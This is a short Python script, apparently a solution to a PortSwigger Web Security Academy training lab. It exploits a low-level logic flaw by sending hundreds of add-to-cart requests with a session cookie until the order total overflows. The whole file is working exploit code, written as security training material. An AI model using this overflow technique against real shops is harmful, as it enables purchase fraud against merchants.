#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Script to exploit "Low-level logic flaw" lab at
# "https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level".
#
# by Psycho (@UDPsycho)
#   Twitter: https://www.twitter.com/UDPsycho
#

import sys
import requests


def make_requests(total_requests, product_quantity):

  # Required for color output
  RED    = "\033[1;91m"
  GREEN  = "\033[1;92m"
  CYAN   = "\033[96m"
  RESET  = "\033[0m"

  i=1
  while i <= total_requests:

    data = { "productId":1, "redir":"PRODUCT", "quantity":product_quantity }

    response = requests.post(target, cookies=cookies, data=data, allow_redirects=False)

    if (response.status_code == 302):
      print ("  Request {}{}{} of {}{}{}\t{}Done{}"
        .format(CYAN, i, RESET, CYAN, total_requests, RESET, GREEN, RESET))

    else:
      print ("  Request {}{}{} of {}{}{}\t{}Failed{}"
        .format(CYAN, i, RESET, CYAN, total_requests, RESET, RED, RESET))

    i+=1


if len(sys.argv) != 3:
  print ("\nUsage: {} https://<lab_url>/cart session=<value>\n".format(sys.argv[0]))

else:

  target       = sys.argv[1]
  cookie_name  = sys.argv[2].split("=")[0]
  cookie_value = sys.argv[2].split("=")[1]

  TOTAL_REQUESTS   = 324
  PRODUCT_QUANTITY = 99

  cookies = { cookie_name : cookie_value }


  print ("\nMaking the requests, please wait...\n")

  make_requests(TOTAL_REQUESTS, PRODUCT_QUANTITY)

  print ("\nMaking the last request to adjust the 'Total'...\n")

  make_requests(1, 47)

  print ("\nThe requests has been completed (remember to add another products manually).\n")
